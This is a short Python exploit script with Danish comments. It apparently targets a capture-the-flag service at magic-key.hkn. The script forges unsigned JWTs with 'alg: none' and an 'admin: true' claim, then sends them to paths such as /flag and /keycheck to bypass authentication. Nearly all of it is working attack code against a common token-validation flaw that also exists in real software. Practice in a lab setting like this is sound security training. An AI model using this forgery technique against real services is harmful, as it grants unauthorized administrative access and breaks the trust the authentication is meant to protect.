#!/usr/bin/env python3
"""
JWT 'alg:none' forgery mod magic-key.hkn.
Kør dette PAA DIN EGEN Kali-maskine (har netadgang til .hkn-domaenerne).
"""
import base64, json, time, sys
import urllib.request

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

now = int(time.time())
header = {"alg": "none", "typ": "JWT"}
payload = {"admin": True, "timestamp": now}

h = b64url(json.dumps(header, separators=(',', ':')).encode())
p = b64url(json.dumps(payload, separators=(',', ':')).encode())

tokens_to_try = [
    f"{h}.{p}.",   # trailing dot, tom signatur
    f"{h}.{p}",    # ingen trailing dot
]

paths_to_try = ["/", "/next_chars", "/flag", "/keycheck"]

for tok in tokens_to_try:
    print(f"\n=== Token: {tok} ===")
    for path in paths_to_try:
        url = f"http://magic-key.hkn{path}"
        req = urllib.request.Request(url, headers={"JWT": tok})
        try:
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode(errors="replace")
                print(f"[{resp.status}] {path} -> {body[:300]}")
        except urllib.error.HTTPError as e:
            body = e.read().decode(errors="replace")
            print(f"[{e.code}] {path} -> {body[:300]}")
        except Exception as e:
            print(f"[ERR] {path} -> {e}")
